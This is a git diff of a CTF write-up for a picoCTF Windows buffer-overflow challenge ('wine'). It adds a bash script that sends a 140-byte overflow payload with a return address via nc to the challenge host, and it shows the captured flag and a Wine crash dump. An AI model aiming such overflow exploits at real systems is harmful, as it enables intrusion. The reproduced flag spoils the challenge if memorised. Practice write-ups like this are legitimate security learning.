@@ -222,7 +222,7 @@ Non-debugging symbols:
 gef➤
 ```
 
-Now here's the exploit command, I didn't really put it in form of a exploit script i had problem receiving the flag part 😜
+Now here's the exploit command, I didn't really put it in form of a python exploit script i had problem receiving the flag part 😞
 
 ```
 Payload: (python -c "print 'A'*140 +'\x30\x15\x40'")
@@ -273,6 +273,90 @@ System information:
     Version: Windows Server 2008 R2
     Host system: Linux
     Host version: 5.15.0-1023-aws
+```
+
+But i was able to make a bash exploit (as fun as py also 😄)
+
+```
+#!/usr/bin/bash
+
+# Check if the required number of arguments have been provided
+if [ $# -ne 2 ]; then
+  echo "Error: This script requires two arguments - IP address and port number"
+  exit 1
+fi
+
+ip=$1
+port=$2
+
+# Generate payload string
+payload=$(python -c "print 'A'*140 +'\x30\x15\x40'")
+
+# Send the payload to the specified IP and port
+echo $payload | nc $ip $port
+
+# Check if the connection was successful
+if [ $? -ne 0 ]; then
+  echo "Error: Failed to connect to $ip:$port"
+  exit 1
+fi
+
+echo "Payload sent successfully to $ip:$port"
+```
+
+On running it
+
+```
+┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
+└─$ chmod +x exploit.sh
+                                                                                                        
+┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
+└─$ ./exploit.sh          
+Error: This script requires two arguments - IP address and port number
+                                                                                                        
+┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
+└─$ ./exploit.sh saturn.picoctf.net 53956
+Give me a string!
+picoCTF{Un_v3rr3_d3_v1n_1b905d38}
+Unhandled exception: page fault on read access to 0x7fec39e0 in 32-bit code (0x7fec39e0).
+Register dump:
+ CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
+ EIP:7fec39e0 ESP:0064fe84 EBP:41414141 EFLAGS:00010206(  R- --  I   - -P- )
+ EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4
+ ESI:00000005 EDI:0021d6b8
+Stack dump:
+0x0064fe84:  00000000 00000004 00000000 7b432ecc
+0x0064fe94:  00230e78 0064ff28 00401386 00000002
+0x0064fea4:  00230e70 006d0da0 7bcc4625 00000004
+0x0064feb4:  00000008 00230e70 0021d6b8 006145be
+0x0064fec4:  3813df36 00000000 00000000 00000000
+0x0064fed4:  00000000 00000000 00000000 00000000
+Backtrace:
+=>0 0x7fec39e0 (0x41414141)
+0x7fec39e0: hlt
+Modules:
+Module  Address                 Debug info      Name (5 modules)
+PE        400000-  44b000       Deferred        vuln
+PE      7b020000-7b023000       Deferred        kernelbase
+PE      7b420000-7b5db000       Deferred        kernel32
+PE      7bc30000-7bc34000       Deferred        ntdll
+PE      7fe10000-7fe14000       Deferred        msvcrt
+Threads:
+process  tid      prio (all id:s are in hex)
+00000008 (D) Z:\challenge\vuln.exe
+        00000009    0 <==
+0000000c services.exe
+        0000000e    0
+        0000000d    0
+00000012 explorer.exe
+        00000013    0
+System information:
+    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
+    Platform: i386
+    Version: Windows Server 2008 R2
+    Host system: Linux
+    Host version: 5.15.0-1023-aws
+Payload sent successfully to saturn.picoctf.net:53956
 ```
 
 And we're done 
